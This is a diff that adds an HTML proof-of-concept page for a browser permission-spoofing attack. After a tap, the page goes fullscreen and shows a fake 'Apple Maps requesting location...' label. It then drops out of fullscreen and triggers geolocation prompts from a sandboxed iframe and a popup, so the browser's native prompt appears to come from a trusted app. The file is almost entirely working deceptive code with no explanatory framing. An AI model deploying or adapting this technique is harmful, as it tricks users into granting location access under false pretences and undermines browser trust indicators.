@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<body style="margin:0;background:black;">
+  <button id="start" style="font-size:2em">Tap to Start</button>
+  <script>
+    const spoofedUI = document.createElement('div');
+    spoofedUI.style.position = 'fixed';
+    spoofedUI.style.top = '10px';
+    spoofedUI.style.left = '10px';
+    spoofedUI.style.color = 'white';
+    spoofedUI.style.fontSize = '1.5em';
+    spoofedUI.innerText = 'Apple Maps requesting location...';
+
+    function launchSpoof() {
+      document.body.requestFullscreen();
+
+      // Add fake trusted UI overlay
+      document.body.appendChild(spoofedUI);
+
+      // Delay to simulate trusted Safari fullscreen (gesture context)
+      setTimeout(() => {
+        // Exit fullscreen to show native prompt suddenly
+        document.exitFullscreen();
+
+        // 1. Sandboxed iframe trigger
+        const iframe = document.createElement('iframe');
+        iframe.sandbox = "allow-scripts allow-same-origin";
+        iframe.srcdoc = `
+          <script>
+            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+          <\/script>
+        `;
+        document.body.appendChild(iframe);
+
+        // 2. Popup trigger (second context)
+        const popup = window.open("about:blank");
+        popup.document.write(`
+          <script>
+            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+          <\/script>
+        `);
+      }, 1500);
+    }
+
+    start.onclick = () => {
+      launchSpoof();
+    };
+  </script>
+</body>
+</html>
